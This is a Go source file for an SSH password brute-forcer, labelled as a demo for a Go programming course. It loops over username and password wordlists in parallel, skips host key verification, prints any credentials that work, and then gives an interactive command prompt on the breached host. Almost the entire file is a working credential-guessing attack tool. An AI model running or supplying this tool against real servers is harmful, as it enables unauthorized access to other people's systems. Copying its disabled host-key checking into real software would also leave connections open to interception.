
// Although this program technically works, you can only run simple commands like:
// pwd, ls, whoami & exit
// this program is more of a go demo that was written for the course taught by
// Tero Karvinen
// http://terokarvinen.com/2020/go-programming-course-2020-w22/

package main

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"flag"
	"os/user"
	"log"
	"bytes"
	"os"
	"bufio"
	"time"
	"sync"
)

const LIMIT = 10

var throttler = make(chan int, LIMIT)

// struct to store flag values
type Options struct {
        userlist string
        passlist string
        user string
        pass string
	host string
}

// read file and return slice containing data
func read(file string) []string {
        slice := make([]string, 0)

        data, err := os.Open(file)
        if err != nil {
                log.Fatal(err)
        }
        defer data.Close()

        scanner := bufio.NewScanner(data)
        for scanner.Scan() {
                slice = append(slice, scanner.Text())
        }
        if err := scanner.Err(); err != nil{
                log.Fatal(err)
        }

        return slice
}

// function to fetch the username of the user running this program to pass for the default user flag
func getUser() string {
	user, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	return user.Username
}

func connect(wg *sync.WaitGroup, username string, pass string, host string)  {
	defer wg.Done()
	var input string
	var b bytes.Buffer
	// config that is mandatory in order to make a successful connection
        config := &ssh.ClientConfig {
                User: username,
                Auth: []ssh.AuthMethod {
                ssh.Password(pass), // for some reason this comma has to be here
                },
		Timeout: 5 * time.Second,
                HostKeyCallback: ssh.InsecureIgnoreHostKey(), // comments on https://gist.github.com/svett/b7f56afc966a6b6ac2fc
        }
	config.SetDefaults()

        // dial the server, establishing a client connection and initiating the SSH handshake
        client, err := ssh.Dial("tcp", host + ":22", config) // client gets assigned as net.Conn
        if err != nil {
		<-throttler
		return
	}
	fmt.Printf("\n !!!! Connection established! Correct creds are: %v:%v !!!!\n", username, pass)

        for input != "exit" {

        // establish the interactive session using client.NewSession()
                session, err := client.NewSession()
                if err != nil {
                log.Fatal("Failed to create session: ", err.Error())
                }

                defer session.Close()

                fmt.Scanln(&input)
                session.Stdout = &b
                if err := session.Run(input); err != nil {
                        log.Fatal("Failed to run (probably an illegal command): " + err.Error())
                }

                fmt.Println(b.String())
                b.Reset()
                }

                fmt.Println("Exiting...")
		<-throttler

        }

// use a pointer to reference the options the user sent and start bruteforcing based on the set parameters
func (opt *Options) brute() {
	var wg sync.WaitGroup
	if opt.userlist != "" && opt.passlist != "" {
                users := read(opt.userlist)
                passwords := read(opt.passlist)

		for _, user := range users {
			for _, password := range passwords {
                                throttler <- 0
				wg.Add(1)
				go connect(&wg, user, password, opt.host)
				}
                        }
        } else if opt.userlist != "" && opt.pass != "" {
		users := read(opt.userlist)

		for _, user := range users {
			throttler <- 0
			wg.Add(1)
			go connect(&wg, user, opt.pass, opt.host)
		}
	} else if opt.user != "" && opt.passlist != "" {
		passwords := read(opt.passlist)

		for _, password := range passwords {
			throttler <- 0
			wg.Add(1)
			go connect(&wg, opt.user, password, opt.host)
                }
	} else if opt.user != "" && opt.pass != "" {
                connect(&wg, opt.user, opt.pass, opt.host)
        } else {
                log.Fatal("Unexpected error")
        }
	wg.Wait()
}

func main() {
        opt := Options{}

        flag.StringVar(&opt.userlist, "U", "", "Wordlist containing usernames. e.g. '/path/to/wordlist'")
        flag.StringVar(&opt.passlist, "P", "", "Wordlist containing passwords. e.g. '/path/to/wordlist'")
        flag.StringVar(&opt.user, "u", getUser(), "Remote username.")
        flag.StringVar(&opt.pass, "p", "", "Remote password.")
	flag.StringVar(&opt.host, "h", "127.0.0.1", "Remote host.")

	flag.Parse()

	opt.brute()

}
